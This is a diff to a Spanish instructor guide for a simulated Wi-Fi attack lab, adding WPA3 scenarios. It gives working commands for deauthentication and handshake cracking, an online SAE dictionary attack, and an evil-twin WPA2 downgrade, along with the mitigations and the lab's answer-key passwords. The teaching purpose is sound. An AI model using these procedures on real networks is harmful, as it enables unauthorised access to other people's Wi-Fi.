@@ -20,7 +20,7 @@ sudo ./despliegue.sh
 ```
 
 El script instala lo que falte (`hostapd`, `hcxtools`, `pocl-opencl-icd`,
-`ocl-icd-libopencl1`), levanta los 7 escenarios y, al terminar, imprime el
+`ocl-icd-libopencl1`), levanta los 10 escenarios y, al terminar, imprime el
 **SSID, canal y BSSID real** de cada uno (las claves no se muestran). Los BSSID
 cambian en cada despliegue. Las interfaces de trabajo del alumno son
 **`wlan0` … `wlan6`**.
@@ -67,6 +67,15 @@ sudo iw dev wlan0 set channel 11
 | `he_pmkid_nc`   | 4  | WPA2-PSK    | PMKID **sin** clientes (*clientless*)      | `football` |
 | `he_enterprise` | 3  | WPA2-EAP    | Análisis pasivo de EAP-PEAP                | Identidad `alumno@iesvjp.es` · tipo EAP 25 (PEAP) · cert. `radius.domain.lab` |
 | `he_wps`        | 7  | WPA2-PSK + WPS | Fuerza bruta online del PIN WPS         | PIN y clave **aleatorios en cada despliegue** (ver sección 7) |
+| `he_wpa3_tm`    | 2  | WPA2/WPA3 mixto | Atacar la parte WPA2 de una red en transición | `princess` (por la vía WPA2) |
+| `he_wpa3`       | 5  | WPA3-SAE puro  | Diccionario **online** contra SAE          | `iloveyou` (solo online) |
+| `he_wpa3_dg`    | 10 | WPA3-SAE puro  | Downgrade a WPA2 con AP gemelo (Dragonblood) | `babygirl` (por el M2 robado) |
+
+Las claves de los tres escenarios WPA3 (`princess`, `iloveyou`, `babygirl`)
+están en `rockyou.txt`, a propósito: la lección de WPA3 es que sin una clave
+débil estos ataques no llegan a ninguna parte. SAE **no admite** la PMK en hex
+(`sae_password` necesita la passphrase en claro), así que aquí no hay anti-cheat
+por diseño del protocolo: las claves están en `despliegue.sh`.
 
 Las tres claves WPA2 de `he_wpa2`, `he_pmkid` y `he_pmkid_nc` y la contraseña
 del usuario Enterprise (`computer`) están en `rockyou.txt`. La clave de
@@ -1231,6 +1240,330 @@ no funciona. Para enseñarlo habría que compilar un hostapd con E-S1 = E-S2 = 0
 
 ---
 
+## 8. WPA3 — tres escenarios (`he_wpa3_tm`, `he_wpa3`, `he_wpa3_dg`)
+
+WPA3-Personal sustituye el PSK de WPA2 por **SAE** (*Simultaneous
+Authentication of Equals*, también llamado *Dragonfly*). La idea para el alumno
+es clara: **un WPA3 bien configurado no se crackea como WPA2**. Lo que se ataca
+es lo que falla en la práctica: el **modo de transición** (que arrastra WPA2),
+el **downgrade** de clientes mal configurados y las **contraseñas débiles** (que
+solo caen por diccionario *online*, mucho más lento). Los tres canales libres
+usados son el 2, el 5 y el 10.
+
+### Por qué SAE no es crackeable offline
+
+En WPA2-PSK la PMK es `PBKDF2(passphrase, SSID)`: una función de la contraseña
+y nada más. Quien captura el handshake o el PMKID puede probar contraseñas
+offline, sin el AP. En SAE no:
+
+```
+Cada parte elige un número secreto aleatorio y hace "hunting and pecking":
+  deriva un punto P de la curva elíptica a partir de (passphrase, MAC_A, MAC_B).
+Commit:  A -> B :  scalar_A, element_A      (y al revés)
+         (scalar y element se construyen con el secreto aleatorio y con P)
+Confirm: A -> B :  HMAC sobre los commits, con una clave derivada del secreto
+                   compartido que solo se obtiene si ambos conocen la passphrase
+PMK = se deriva del secreto compartido (distinto en cada conexión)
+```
+
+- El intercambio es un **PAKE** (intercambio de claves autenticado por
+  contraseña): lo que viaja (scalars y elements) son puntos de curva elíptica
+  enmascarados con números aleatorios de un solo uso. **No es un verificador
+  offline de la contraseña**: sin el secreto aleatorio de la otra parte no se
+  puede comprobar ninguna candidata contra lo capturado.
+- Por eso capturar Commit/Confirm con airodump o hcxdumptool **no sirve**:
+  `hcxpcapngtool` no escribe ninguna línea 22000 crackeable, y `aircrack-ng`
+  dice `no valid WPA handshakes found`. Es el resultado que el alumno debe
+  comprobar **antes** de pasar a los ataques que sí funcionan.
+- SAE añade **forward secrecy** (cada sesión tiene su secreto; comprometer la
+  contraseña no descifra capturas antiguas) y **PMF obligatoria** (los deauth
+  falsificados no funcionan).
+
+### Comprobar el soporte SAE
+
+`despliegue.sh` ya lo verifica al arrancar (prueba `wpa_key_mgmt=SAE` contra una
+interfaz falsa). A mano:
+
+```bash
+printf 'interface=x\ndriver=nl80211\nssid=p\nwpa=2\nwpa_key_mgmt=SAE\nrsn_pairwise=CCMP\nieee80211w=2\nsae_password=prueba123\n' > /tmp/sae.conf
+sudo hostapd /tmp/sae.conf 2>&1 | grep -c "invalid key_mgmt"   # 0 = tiene SAE
+```
+
+El Kali actual trae hostapd y wpa_supplicant con SAE. No hace falta recompilar
+nada: los tres escenarios usan el hostapd del sistema.
+
+---
+
+## 8.1 `he_wpa3_tm` — Modo de transición (WPA2/WPA3 mixto)
+
+Es la configuración **más común** en routers domésticos: para no dejar fuera a
+los dispositivos antiguos, el AP acepta **SAE y PSK con la misma contraseña**.
+El resultado es que la red es tan débil como su parte WPA2.
+
+### Cómo está montado
+
+- `wpa_key_mgmt=WPA-PSK SAE`: el AP anuncia los dos métodos en el RSN IE del
+  beacon.
+- `ieee80211w=1` (PMF **opcional**): obligatoria rompería a los clientes WPA2.
+  `sae_require_mfp=1` obliga a PMF solo a los clientes que entran por SAE.
+- **Dos clientes**: `wlan_cli3_tm` (WPA3/SAE + PMF) y `wlan_cli2_tm`
+  (WPA2-PSK, sin PMF), el "dispositivo antiguo".
+
+Al desplegar deben salir los dos `[✓] Cliente he_wpa3_tm ...`.
+
+### a) Atacar la parte WPA2 (lo que funciona)
+
+Igual que `he_wpa2`, pero dirigido **al cliente antiguo**:
+
+```bash
+sudo airmon-ng start wlan0 2
+BSSID=<BSSID_TM>
+CLIENT_WPA2=<MAC de wlan_cli2_tm>     # lo das tú; en airodump es el que reasocia con el deauth
+
+sudo airodump-ng -c 2 --bssid $BSSID -w cap_tm wlan0mon
+# Otra terminal: deauth al cliente SIN PMF
+sudo aireplay-ng -0 3 -a $BSSID -c $CLIENT_WPA2 wlan0mon
+# Al reconectar, airodump marca "WPA handshake"
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b $BSSID cap_tm-01.cap
+```
+
+**Resultado esperado:** `princess`. Y esa clave sirve también para entrar por
+WPA3, porque es la misma.
+
+### b) El contraste: el mismo deauth contra el cliente WPA3 **no hace nada**
+
+```bash
+sudo aireplay-ng -0 10 -a $BSSID -c <MAC de wlan_cli3_tm> wlan0mon
+```
+
+El cliente SAE tiene PMF: ignora el deauth falsificado (responde con una *SA
+Query* protegida y sigue conectado). En airodump, su línea no se corta y no
+aparece ningún handshake nuevo suyo. Es la demostración en directo de para qué
+sirve 802.11w.
+
+**Cómo distinguir los dos clientes en airodump.** Los dos están en la lista
+STATION del mismo BSSID. El que se cae y reasocia con el deauth es el WPA2; el
+que lo aguanta es el WPA3. Para confirmarlo desde el host:
+
+```bash
+sudo ip netns exec ns_cli2_tm wpa_cli -p /var/run/wpa_supplicant_tm2 -i wlan_cli2_tm status | grep -E 'key_mgmt|pmf'
+sudo ip netns exec ns_cli3_tm wpa_cli -p /var/run/wpa_supplicant_tm3 -i wlan_cli3_tm status | grep -E 'key_mgmt|pmf'
+# tm2: key_mgmt=WPA2-PSK, pmf=0   |   tm3: key_mgmt=SAE, pmf=2
+```
+
+### Fundamento técnico
+
+- **El modo de transición expone un RSN IE con los dos AKM** (PSK y SAE). Un
+  atacante solo tiene que ir a por el AKM más débil: el handshake WPA2 es
+  crackeable offline exactamente igual que en `he_wpa2`.
+- **PMF no puede ser obligatoria** sin dejar fuera a los clientes WPA2, así que
+  esos clientes siguen siendo vulnerables al deauth. Solo los clientes SAE,
+  protegidos por PMF, lo resisten.
+- **Mitigación:** cuando ya no haga falta compatibilidad, WPA3 puro. Mientras
+  tanto, **Transition Disable** (ver 8.3): el AP indica a los clientes capaces
+  de SAE que dejen de usar WPA2 para ese SSID, aunque esto no protege a los
+  dispositivos que solo hablan WPA2.
+
+---
+
+## 8.2 `he_wpa3` — WPA3 puro (solo SAE): diccionario **online**
+
+AP solo SAE, PMF obligatoria (`ieee80211w=2`). No hay nada crackeable offline.
+El único ataque es probar contraseñas **haciendo un intercambio SAE real con el
+AP**, una por conexión. Contraseña débil a propósito (`iloveyou`).
+
+### a) Primero, comprobar que lo de siempre NO funciona
+
+Es la parte más importante de la práctica. El alumno intenta capturar y crackear
+como en los escenarios anteriores:
+
+```bash
+sudo airmon-ng start wlan0 5
+BSSID=<BSSID_WPA3>
+sudo airodump-ng -c 5 --bssid $BSSID -w cap_wpa3 wlan0mon
+# El cliente reasocia cada 30 s (el deauth no sirve: PMF). Esperar y Ctrl+C.
+
+# Intento de crackeo (fracasa):
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b $BSSID cap_wpa3-01.cap
+hcxpcapngtool -o wpa3.22000 cap_wpa3-01.cap && ls -l wpa3.22000
+```
+
+**Resultado:** aircrack-ng dice `no valid WPA handshakes found` y
+`hcxpcapngtool` no escribe ninguna línea (0 hashes). SAE no deja material
+offline. Conviene enseñar la captura en Wireshark filtrando `wlan.fixed.auth.alg
+== 3` (SAE): se ven los *Commit* y *Confirm*, pero no hay nada que crackear.
+
+### b) El ataque que sí aplica: diccionario online (`sae_online.sh`)
+
+En el laboratorio va incluido `sae_online.sh`, que automatiza el diccionario
+online con `wpa_supplicant`. Usa una interfaz del alumno (en managed, no
+monitor):
+
+```bash
+sudo ./sae_online.sh -i wlan2 -s he_wpa3 -b <BSSID_WPA3> -c 5 -n 500
+```
+
+El script prueba cada contraseña con un intercambio SAE completo y se detiene al
+encontrarla, midiendo la velocidad:
+
+```
+[  12] Probando: iloveyou
+[✓] CONTRASEÑA ENCONTRADA: 'iloveyou'  (12 intentos en 7 s)
+    Velocidad: 1.71 intentos/s -> rockyou completo (14,3 M): 97 días
+```
+
+**Resultado esperado:** `iloveyou`. Lo revelador es la **velocidad**: 1-3
+intentos/s. La extrapolación que imprime el script es la lección: rockyou
+entero tardaría **meses**, y una contraseña robusta, inviable. Compáralo con
+los ~pocos segundos del mismo diccionario offline en `he_wpa2`.
+
+> **Alternativa pública:** existe `wacker` (script en Python sobre `wpa_cli`,
+> mismo principio). `sae_online.sh` evita tener que clonarlo y da la medida de
+> velocidad ya hecha. Si prefieres `wacker`, el procedimiento es equivalente.
+
+### Fundamento técnico
+
+- **Online, no offline.** Cada candidata exige el *hunting-and-pecking* (derivar
+  el punto de la curva) y un intercambio Commit/Confirm con el AP. Sin el AP no
+  se avanza, y el AP responde a su ritmo (un intento tarda segundos, no
+  microsegundos). No hay GPU que acelere esto.
+- **El AP puede defenderse.** Al ser online, el AP ve muchos *Commit* fallidos
+  seguidos y puede limitar la tasa o bloquear. hostapd tiene
+  `sae_anti_clogging_threshold` (ahora `anti_clogging_threshold`) que, superado
+  un número de *commits* en curso, exige un token y frena la fuerza bruta. En
+  este escenario no se activa para que la práctica avance; en el fundamento se
+  comenta como defensa.
+- **Ataques de canal lateral (Dragonblood, Vanhoef–Ronen 2019) — no
+  reproducibles aquí.** El *hunting-and-pecking* original tenía fugas de
+  **tiempo** y de **caché** que permitían recuperar información de la contraseña
+  y reducir el espacio de búsqueda. Dos motivos para no montarlo: (1) están
+  corregidos desde hostapd 2.8 con **Hash-to-Element (H2E)**, la derivación en
+  tiempo constante (`sae_pwe=1` o `2`); (2) medir tiempos en `mac80211_hwsim`
+  no es fiable. Se explican, pero no se practican.
+- **Mitigación:** contraseña larga y aleatoria (hace inviable el online);
+  **H2E** (`sae_pwe=2`) contra los canales laterales; limitación de tasa de
+  *commits* en el AP.
+
+---
+
+## 8.3 `he_wpa3_dg` — Downgrade de un cliente WPA3 (Dragonblood)
+
+El AP es **solo WPA3** (SAE + PMF), correcto. La debilidad está en el
+**cliente**: su perfil guardó la red aceptando también WPA2 (`key_mgmt=SAE
+WPA-PSK`), como un móvil que recuerda la red como "WPA2/WPA3". Un **AP gemelo
+solo WPA2** con el mismo SSID consigue que el cliente le hable WPA2 y le entregue
+un M2 calculado con la clave real, que se crackea offline. Es el *downgrade
+attack* de Vanhoef y Ronen.
+
+### Cómo está montado
+
+- AP real `he_wpa3_dg`: `wpa_key_mgmt=SAE`, `ieee80211w=2`. Impecable.
+- Cliente `wlan_cli_dg`: `key_mgmt=SAE WPA-PSK`, `ieee80211w=1` (PMF opcional).
+  Esta línea es la vulnerabilidad: acepta volver a WPA2.
+- El cliente se reasocia cada 30 s (`select_network` + `reassociate`), así el
+  alumno no depende de un deauth (que PMF bloquearía).
+
+### a) Montar el AP gemelo solo WPA2 y capturar
+
+```bash
+BSSID_REAL=<BSSID_DG>
+
+# Config del gemelo: MISMO SSID, solo WPA2, MISMA contraseña NO hace falta
+# (basta con que el cliente envíe el M2; su MIC se calcula con su clave real)
+cat << 'EOF' | sudo tee /tmp/gemelo.conf > /dev/null
+interface=wlan1
+driver=nl80211
+ssid=he_wpa3_dg
+hw_mode=g
+channel=10
+wpa=2
+wpa_key_mgmt=WPA-PSK
+rsn_pairwise=CCMP
+wpa_passphrase=loquesea12345
+EOF
+
+# El gemelo registra el intento de conexión del cliente
+sudo hostapd -dd /tmp/gemelo.conf 2>&1 | tee /tmp/gemelo.log &
+
+# Capturar en el canal 10
+sudo airmon-ng start wlan0 10
+sudo airodump-ng -c 10 --bssid $BSSID_REAL -w cap_dg wlan0mon
+```
+
+Cuando el cliente reasocie (cada 30 s) y elija el gemelo, enviará M1/M2 WPA2.
+airodump marcará `WPA handshake`. Basta M1+M2.
+
+> En `mac80211_hwsim` todas las radios se oyen igual, así que el cliente puede
+> seguir prefiriendo el AP real. Si en 1-2 minutos no cae, fuerza la
+> demostración parando un momento el AP legítimo:
+> `sudo ip netns exec ns_ap_dg pkill hostapd` (y redespliega al terminar), o
+> mantén el gemelo corriendo y espera varias reasociaciones.
+
+### b) Crackear el M2 robado
+
+```bash
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b $BSSID_REAL cap_dg-01.cap
+# o hashcat
+hcxpcapngtool -o dg.22000 cap_dg-01.cap
+hashcat -m 22000 dg.22000 /usr/share/wordlists/rockyou.txt
+```
+
+**Resultado esperado:** `babygirl`. El cliente ha calculado el MIC del M2 con la
+PMK de WPA2 = `PBKDF2(babygirl, SSID)`, que **sí** es crackeable offline, aunque
+el AP real solo hablara WPA3.
+
+### c) La mitigación: Transition Disable
+
+Redespliega activando la bandera y repite el ataque:
+
+```bash
+sudo ./limpia.sh
+sudo DG_TRANSITION_DISABLE=1 ./despliegue.sh
+```
+
+Ahora el AP real incluye el elemento **Transition Disable** en el handshake. La
+primera vez que el cliente se conecta por SAE, wpa_supplicant **anota que esta
+red ya no debe aceptar WPA2** y a partir de ahí rechaza al gemelo. Repitiendo el
+apartado a), el cliente ya no entrega ningún M2 WPA2: no hay handshake que
+capturar. Para comprobar que la bandera está puesta:
+
+```bash
+sudo ip netns exec ns_cli_dg wpa_cli -p /var/run/wpa_supplicant_dg -i wlan_cli_dg status | grep -i mgmt
+# Tras conectarse con transition_disable, el cliente fija key_mgmt=SAE y descarta WPA-PSK
+```
+
+### Fundamento técnico
+
+- **El downgrade lo habilita el cliente, no el AP.** Un cliente que acepta
+  "WPA2 o WPA3" para un SSID enviará un M2 WPA2 a cualquier AP con ese SSID que
+  solo ofrezca WPA2. El atacante no necesita la contraseña para provocar ese M2:
+  lo calcula el cliente, con su clave real, y su MIC es un verificador offline
+  como en `he_wpa2`.
+- **PMF no lo impide.** PMF protege las tramas de gestión (deauth), pero no
+  decide a qué AP se asocia el cliente ni qué AKM negocia. El downgrade ocurre en
+  la asociación, no en un deauth.
+- **Transition Disable (WFA, 2020)** es la defensa estándar: un bit que el AP
+  envía dentro del 4-way (protegido) y que indica al cliente que "pegue" la red
+  a WPA3/SAE y no vuelva a aceptar WPA2, WPS ni PMF opcional. Es cosa del
+  cliente recordarlo, por eso la vulnerabilidad vive en el cliente.
+- **Mitigación:** no guardar redes en modo mixto cuando el AP ya es WPA3;
+  Transition Disable; y en clientes gestionados, perfiles que fijen SAE y PMF
+  obligatoria.
+
+---
+
+## 8.4 El escenario 2 como práctica guiada (sin AP dedicado)
+
+`he_wpa3_dg` ya trae un AP y un cliente para que el downgrade funcione "solo".
+Si prefieres que el alumno **monte él** todo el ataque (más realista, el AP
+gemelo lo levanta con su propia interfaz), puede hacerlo contra `he_wpa3_tm` o
+contra `he_wpa3_dg` con el procedimiento del apartado 8.3.a: el AP gemelo WPA2 en
+`wlan1`, el deauth (si el objetivo no tiene PMF) o la espera a la reasociación, y
+el crackeo del M2. La diferencia es solo quién levanta el gemelo: el escenario lo
+automatiza; la práctica guiada lo pone en manos del alumno.
+
+---
+
 ## Mantenimiento: cambiar las claves
 
 - **WPA2:** las claves se guardan como PMK (64 hex) en `despliegue.sh`, en el
@@ -1254,6 +1587,13 @@ no funciona. Para enseñarlo habría que compilar un hostapd con E-S1 = E-S2 = 0
   módulos de `WPS_PIN7` (`RANDOM % 100` en cada mitad). Si los subes, el
   ataque tarda más; con `% 10000` y `% 1000` tendrías el caso real completo.
 
+- **WPA3 (`he_wpa3_tm`, `he_wpa3`, `he_wpa3_dg`):** SAE no admite PMK en hex,
+  así que la contraseña va en claro (`wpa_passphrase` / `sae_password`) en el
+  `hostapd.conf` de cada uno dentro de `despliegue.sh`. Cámbiala ahí y en el
+  `wpa.conf`/`wpa3.conf`/`wpa2.conf` del cliente correspondiente. Usa palabras de
+  `rockyou.txt`. Para que `he_wpa3` siga siendo didáctico, mantén una clave que
+  esté pronto en el diccionario (el ataque es online y lento).
+
 Tras cambiar una clave, actualiza la tabla de soluciones de esta guía.
 
 ---
@@ -1269,6 +1609,14 @@ sudo ip netns exec ns_ap_pmkid_nc iw dev
 pgrep -af LAB_WPS_WATCHDOG
 sudo ip netns exec ns_ap_wps hostapd_cli -p /var/run/hostapd_wps -i wlan_ap_wps wps_get_status
 
+# Clientes WPA3 conectados (key_mgmt y PMF de cada uno)
+for ns in tm3:ns_cli3_tm:wlan_cli3_tm:tm3 tm2:ns_cli2_tm:wlan_cli2_tm:tm2 \
+          w3:ns_cli_wpa3:wlan_cli_wpa3:wpa3 dg:ns_cli_dg:wlan_cli_dg:dg; do
+  IFS=: read -r et nsx ifx ctl <<< "$ns"
+  echo -n "$et: "
+  sudo ip netns exec "$nsx" wpa_cli -p "/var/run/wpa_supplicant_$ctl" -i "$ifx" status 2>/dev/null | grep -E 'wpa_state|key_mgmt|pmf' | paste -sd' '
+done
+
 # Apagar todo el laboratorio
 sudo ./limpia.sh
 ```
@@ -1283,3 +1631,5 @@ sudo ./limpia.sh
 - **hashcat** (modo `22000` = WPA-PBKDF2-PMKID+EAPOL), en CPU mediante PoCL
 - **tshark** (análisis de capturas)
 - **reaver / wash** y **bully** (detección de WPS y fuerza bruta del PIN)
+- **sae_online.sh** (diccionario *online* contra WPA3-SAE, incluido en el lab)
+- **hostapd / wpa_supplicant con SAE** (escenarios WPA3; del sistema, sin parches)
